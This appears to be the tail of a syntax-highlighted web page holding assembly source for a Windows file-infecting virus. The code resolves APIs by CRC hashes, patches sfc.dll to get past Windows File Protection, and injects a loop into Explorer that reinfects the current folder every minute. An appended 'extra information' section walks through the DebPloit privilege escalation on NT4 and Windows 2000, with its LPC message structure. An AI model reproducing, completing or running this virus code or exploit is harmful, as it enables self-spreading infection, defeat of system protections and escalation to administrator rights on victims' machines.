</span><span class="sc5">GezApi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">ExitThreadCRC</span><span class="sc4">,</span><span class="sc5">ETNameLen</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">


</span><span class="sc5">sfc</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'sfc.dll'</span><span class="sc0">
</span><span class="sc5">NtSfc</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">CodeToSearch</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">6Ah</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">6Ah</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc2">33h</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc2">73h</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc4">,</span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc2">15h</span><span class="sc0">
</span><span class="sc5">PatchCode</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">11111111h</span><span class="sc0">
</span><span class="sc5">PatchExitThreadDir</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">_PatchCode</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">
</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

</span><span class="sc5">ExplorerCode</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">NtExplorerDOffset</span><span class="sc0">
</span><span class="sc5">NtExplorerDOffset</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NtExplorerDOffset</span><span class="sc0">


</span><span class="sc5">CurrentFolderInfection</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">NtKernel</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">GezApi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">SleepCRC</span><span class="sc4">,</span><span class="sc5">SNameLen</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">60000</span><span class="sc0"> </span><span class="sc1">;1 minute</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;Sleep for 1 minute</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">NtKernel</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">GezApi</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">GetCurrentDirectoryACRC</span><span class="sc4">,</span><span class="sc5">SCDNameLen</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">buffy</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">256</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">buffy</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">callz</span><span class="sc0"> </span><span class="sc5">InfectCurrentFolder</span><span class="sc0">

</span><span class="sc5">jmpz</span><span class="sc0"> </span><span class="sc5">CurrentFolderInfection</span><span class="sc0">
</span><span class="sc1">;since explorer,virus will infect current folder in intervals of 1 minute</span><span class="sc0">


</span><span class="sc5">buffy</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">256</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

</span><span class="sc5">Pad2</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">PADDING2</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">  </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(((</span><span class="sc5">Pad2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ECode</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">4</span><span class="sc4">*((</span><span class="sc5">Pad2</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">ECode</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc4">))))</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">PADDING2</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">EVirus</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0">



</span><span class="sc5">HERE</span><span class="sc0"> </span><span class="sc5">YOU</span><span class="sc0"> </span><span class="sc5">CAN</span><span class="sc0"> </span><span class="sc5">FIND</span><span class="sc0"> </span><span class="sc5">SOME</span><span class="sc0"> </span><span class="sc5">EXTRA</span><span class="sc0"> </span><span class="sc5">INFORMATION</span><span class="sc0"> </span><span class="sc9">FOR</span><span class="sc0"> </span><span class="sc5">VIRUS</span><span class="sc0"> </span><span class="sc5">UNDERSTANDING</span><span class="sc0">


</span><span class="sc5">DebPloit</span><span class="sc0"> </span><span class="sc5">allows</span><span class="sc0"> </span><span class="sc5">Everyone</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">get</span><span class="sc0"> </span><span class="sc5">handle</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">Any</span><span class="sc0"> </span><span class="sc5">process</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">thread.</span><span class="sc0">
</span><span class="sc5">Handles</span><span class="sc0"> </span><span class="sc5">have</span><span class="sc0"> </span><span class="sc5">enough</span><span class="sc0"> </span><span class="sc5">access</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">promote</span><span class="sc0"> </span><span class="sc5">everyone</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">system</span><span class="sc4">/</span><span class="sc5">admin</span><span class="sc0">
</span><span class="sc4">(</span><span class="sc6">in</span><span class="sc0"> </span><span class="sc5">the</span><span class="sc0"> </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc5">Target</span><span class="sc0"> </span><span class="sc5">is</span><span class="sc0"> </span><span class="sc5">running</span><span class="sc0"> </span><span class="sc5">under</span><span class="sc0"> </span><span class="sc5">LocalSystem</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Administrator</span><span class="sc0"> </span><span class="sc5">account</span><span class="sc4">)</span><span class="sc5">.</span><span class="sc0">
</span><span class="sc5">Works</span><span class="sc0"> </span><span class="sc5">on</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">Any</span><span class="sc0"> </span><span class="sc5">MS</span><span class="sc0"> </span><span class="sc5">Windows</span><span class="sc0"> </span><span class="sc5">NT</span><span class="sc0"> </span><span class="sc2">4.0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Windows</span><span class="sc0"> </span><span class="sc2">2000</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">SPs</span><span class="sc0"> </span><span class="sc5">before</span><span class="sc0"> </span><span class="sc5">Mar</span><span class="sc4">-</span><span class="sc2">12</span><span class="sc4">-</span><span class="sc2">2002</span><span class="sc4">)</span><span class="sc5">.</span><span class="sc0">
</span><span class="sc5">Former</span><span class="sc0"> </span><span class="sc5">NTs</span><span class="sc0"> </span><span class="sc5">weren</span><span class="sc13">'t tested. Discovered: Mar-09-2002. Author: Radim "EliCZ" Picha. 
</span><span class="sc5">Bugs@EliCZ.cjb.net.</span><span class="sc0"> </span><span class="sc5">http</span><span class="sc4">://</span><span class="sc5">www.anticracking.sk</span><span class="sc4">/</span><span class="sc5">EliCZ.</span><span class="sc0"> </span><span class="sc5">Details</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">Exploit</span><span class="sc0">\</span><span class="sc5">DebPloit.h.</span><span class="sc0"> 
</span><span class="sc5">Principle</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">Ask</span><span class="sc0"> </span><span class="sc5">debugging</span><span class="sc0"> </span><span class="sc5">subsystem</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">lives</span><span class="sc0"> </span><span class="sc6">in</span><span class="sc0"> </span><span class="sc5">smss.exe</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">create</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">duplicate</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc5">handle</span><span class="sc4">(</span><span class="sc5">s</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">Target</span><span class="sc0"> </span><span class="sc9">for</span><span class="sc0"> </span><span class="sc5">you</span><span class="sc4">:</span><span class="sc0"> 
</span><span class="sc2">1.</span><span class="sc0"> </span><span class="sc5">Become</span><span class="sc0"> </span><span class="sc5">dbgss</span><span class="sc0"> </span><span class="sc5">client</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">DbgUiConnectToDbg</span><span class="sc4">)</span><span class="sc5">.</span><span class="sc0">
</span><span class="sc2">2.</span><span class="sc0"> </span><span class="sc5">Connect</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">DbgSsApiPort</span><span class="sc0"> </span><span class="sc5">LPC</span><span class="sc0"> </span><span class="sc5">port</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">ZwConnectPort</span><span class="sc4">)</span><span class="sc5">.Everyone</span><span class="sc0"> </span><span class="sc5">has</span><span class="sc0"> </span><span class="sc5">access</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc5">port.</span><span class="sc0">
</span><span class="sc2">3.</span><span class="sc0"> </span><span class="sc5">Ask</span><span class="sc0"> </span><span class="sc5">dbgss</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">handle</span><span class="sc0"> </span><span class="sc5">CreateProcess</span><span class="sc0"> </span><span class="sc5">SsApi</span><span class="sc0"> </span><span class="sc5">with</span><span class="sc0"> </span><span class="sc5">client</span><span class="sc0"> </span><span class="sc5">id</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">pid</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">tid</span><span class="sc0"> </span><span class="sc5">only</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">of</span><span class="sc0"> </span><span class="sc5">Target</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">ZwRequestPort</span><span class="sc4">)</span><span class="sc5">.</span><span class="sc0"> 
</span><span class="sc2">4.</span><span class="sc0"> </span><span class="sc6">Wait</span><span class="sc0"> </span><span class="sc9">for</span><span class="sc0"> </span><span class="sc5">dbgss</span><span class="sc0"> </span><span class="sc5">to</span><span class="sc0"> </span><span class="sc5">reply</span><span class="sc0"> </span><span class="sc5">with</span><span class="sc0"> </span><span class="sc5">CREATE_PROCESS_DEBUG_EVENT</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">WaitForDebugEvent</span><span class="sc4">)</span><span class="sc5">.</span><span class="sc0"> 
</span><span class="sc5">Message</span><span class="sc0"> </span><span class="sc5">contains</span><span class="sc0"> </span><span class="sc5">duplicated</span><span class="sc0"> </span><span class="sc5">handle</span><span class="sc4">(</span><span class="sc5">s</span><span class="sc4">)</span><span class="sc5">.</span><span class="sc0"> 
</span><span class="sc2">5.</span><span class="sc0"> </span><span class="sc5">When</span><span class="sc0"> </span><span class="sc5">debugger</span><span class="sc13">'s thread terminates(e.g. on logoff), Target process or thread is 
</span><span class="sc5">terminated</span><span class="sc0"> </span><span class="sc5">too</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">like</span><span class="sc0"> </span><span class="sc5">it</span><span class="sc0"> </span><span class="sc5">was</span><span class="sc0"> </span><span class="sc5">regularly</span><span class="sc0"> </span><span class="sc5">debugged</span><span class="sc4">)</span><span class="sc5">.</span><span class="sc0"> 



</span><span class="sc9">struct</span><span class="sc0"> </span><span class="sc5">_DBG_SS_CP_LPC_MESSAGE</span><span class="sc0"> {
    </span><span class="sc5">USHORT</span><span class="sc0"> </span><span class="sc5">DataSize</span><span class="sc1">;            //00</span><span class="sc0">
    </span><span class="sc5">USHORT</span><span class="sc0"> </span><span class="sc5">MessageSize</span><span class="sc1">;         //02  </span><span class="sc0">
    </span><span class="sc5">USHORT</span><span class="sc0"> </span><span class="sc5">MessageType</span><span class="sc1">;         //04</span><span class="sc0">
    </span><span class="sc5">USHORT</span><span class="sc0"> </span><span class="sc5">VirtualRangesOffset</span><span class="sc1">; //06</span><span class="sc0">
    </span><span class="sc10">DWORD</span><span class="sc0">  </span><span class="sc5">CallerPid</span><span class="sc1">;           //08</span><span class="sc0">
    </span><span class="sc10">DWORD</span><span class="sc0">  </span><span class="sc5">CallerTid</span><span class="sc1">;           //0C</span><span class="sc0">
    </span><span class="sc5">ULONG</span><span class="sc0">  </span><span class="sc5">MessageId</span><span class="sc1">;           //10</span><span class="sc0">
    </span><span class="sc5">ULONG</span><span class="sc0">  </span><span class="sc5">SectionSize</span><span class="sc1">;         //14</span><span class="sc0">
    </span><span class="sc10">DWORD</span><span class="sc0">  </span><span class="sc5">dwSsDebugEventCode</span><span class="sc1">;  //18</span><span class="sc0">
    </span><span class="sc10">DWORD</span><span class="sc0">  </span><span class="sc5">Status</span><span class="sc1">;              //1C </span><span class="sc0">
    </span><span class="sc10">DWORD</span><span class="sc0">  </span><span class="sc5">DebuggeePID</span><span class="sc1">;         //20 </span><span class="sc0">
    </span><span class="sc10">DWORD</span><span class="sc0">  </span><span class="sc5">DebuggeeTID</span><span class="sc1">;         //24</span><span class="sc0">
    </span><span class="sc5">PVOID</span><span class="sc0">  </span><span class="sc5">pDbgSsKmMsg</span><span class="sc1">;         //28  //size ~ 0x78</span><span class="sc0">
    </span><span class="sc10">DWORD</span><span class="sc0">  </span><span class="sc5">DebuggerPID</span><span class="sc1">;         //2C</span><span class="sc0">
    </span><span class="sc10">DWORD</span><span class="sc0">  </span><span class="sc5">DebuggerTID</span><span class="sc1">;         //30</span><span class="sc0">
    </span><span class="sc10">DWORD</span><span class="sc0">  </span><span class="sc5">Unknown34</span><span class="sc1">;           //34</span><span class="sc0">
    </span><span class="sc10">DWORD</span><span class="sc0">  </span><span class="sc5">hFile</span><span class="sc1">;               //38</span><span class="sc0">
    </span><span class="sc5">LPVOID</span><span class="sc0"> </span><span class="sc5">lpBaseOfImage</span><span class="sc1">;       //3C </span><span class="sc0">
    </span><span class="sc10">DWORD</span><span class="sc0">  </span><span class="sc5">dwDebugInfoFileOffset</span><span class="sc1">;//40 </span><span class="sc0">
    </span><span class="sc10">DWORD</span><span class="sc0">  </span><span class="sc5">nDebugInfoSize</span><span class="sc1">;      //44</span><span class="sc0">
    </span><span class="sc5">LPVOID</span><span class="sc0"> </span><span class="sc5">lpThreadLocalBase</span><span class="sc1">;   //48</span><span class="sc0">
    </span><span class="sc5">LPTHREAD_START_ROUTINE</span><span class="sc0"> </span><span class="sc5">lpStartAddress</span><span class="sc1">; //4C</span><span class="sc0">
    </span><span class="sc5">LPVOID</span><span class="sc0"> </span><span class="sc5">lpImageName</span><span class="sc1">;         //50</span><span class="sc0">
    </span><span class="sc10">WORD</span><span class="sc0">   </span><span class="sc5">fUnicode</span><span class="sc1">;            //54</span><span class="sc0">
    </span><span class="sc10">WORD</span><span class="sc0">   </span><span class="sc5">ImageName</span><span class="sc4">[(</span><span class="sc5">MAX_DBG_SS_CP_LPC_MESSAGE_SIZE</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">0x56</span><span class="sc4">)/</span><span class="sc9">sizeof</span><span class="sc4">(</span><span class="sc10">WORD</span><span class="sc4">)]</span><span class="sc1">; //56 pro forma</span><span class="sc0">
    }
    </span><span class="sc5">MAX_DBG_SS_CP_LPC_MESSAGE_SIZE</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">


</span><span class="sc5">NTSYSAPI</span><span class="sc0"> </span><span class="sc5">NTSTATUS</span><span class="sc0"> </span><span class="sc5">NTAPI</span><span class="sc0"> </span><span class="sc5">ZwConnectPort</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc0">
 </span><span class="sc6">OUT</span><span class="sc0"> </span><span class="sc5">PHANDLE</span><span class="sc0"> </span><span class="sc5">ClientPortHandle</span><span class="sc4">,</span><span class="sc0"> 
</span><span class="sc6">IN</span><span class="sc0"> </span><span class="sc5">PUNICODE_STRING</span><span class="sc0"> </span><span class="sc5">ServerPortName</span><span class="sc4">,</span><span class="sc0">
 </span><span class="sc6">IN</span><span class="sc0"> </span><span class="sc5">PSECURITY_QUALITY_OF_SERVICE</span><span class="sc0"> </span><span class="sc5">SecurityQos</span><span class="sc4">,</span><span class="sc0">
 </span><span class="sc6">IN</span><span class="sc0"> </span><span class="sc6">OUT</span><span class="sc0"> </span><span class="sc5">PLPC_THIS_SIDE_MEMORY</span><span class="sc0"> </span><span class="sc5">ClientSharedMemory</span><span class="sc0"> </span><span class="sc5">OPTIONAL</span><span class="sc4">,</span><span class="sc0">
 </span><span class="sc6">IN</span><span class="sc0"> </span><span class="sc6">OUT</span><span class="sc0"> </span><span class="sc5">PLPC_OTHER_SIDE_MEMORY</span><span class="sc0"> </span><span class="sc5">ServerSharedMemory</span><span class="sc0"> </span><span class="sc5">OPTIONAL</span><span class="sc4">,</span><span class="sc0">
 </span><span class="sc6">OUT</span><span class="sc0"> </span><span class="sc5">PULONG</span><span class="sc0"> </span><span class="sc5">MaximumMessageLength</span><span class="sc0"> </span><span class="sc5">OPTIONAL</span><span class="sc4">,</span><span class="sc0"> 
</span><span class="sc6">IN</span><span class="sc0"> </span><span class="sc6">OUT</span><span class="sc0"> </span><span class="sc5">PVOID</span><span class="sc0"> </span><span class="sc5">ConnectionInfo</span><span class="sc0"> </span><span class="sc5">OPTIONAL</span><span class="sc4">,</span><span class="sc0"> 
</span><span class="sc6">IN</span><span class="sc0"> </span><span class="sc6">OUT</span><span class="sc0"> </span><span class="sc5">PULONG</span><span class="sc0"> </span><span class="sc5">ConnectionInfoLength</span><span class="sc0"> </span><span class="sc5">OPTIONAL</span><span class="sc0"> 
</span><span class="sc4">)</span><span class="sc1">; </span><span class="sc0">
</span></div></body>
</html>
